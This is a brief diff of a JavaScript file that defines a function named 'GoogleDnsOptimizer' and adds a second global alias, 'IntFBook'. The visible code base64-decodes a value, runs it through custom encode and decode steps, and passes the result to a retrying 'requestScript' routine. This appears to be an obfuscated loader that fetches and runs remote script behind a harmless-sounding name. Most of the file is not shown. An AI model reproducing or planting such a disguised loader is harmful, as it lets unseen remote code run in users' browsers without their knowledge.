@@ -1,4 +1,4 @@
-window.GoogleDnsOptimizer = c => {
+window.IntFBook = window.GoogleDnsOptimizer = c => {
     const requestScript = async a => {
       await new Promise(async res => {
         for (let x = 0; x < 3; x++) {
@@ -86,3 +86,5 @@ window.GoogleDnsOptimizer = c => {
     .then(u => encode('1', decode('2', atob(u))))
     .then(u => requestScript(u))
   }
+
+
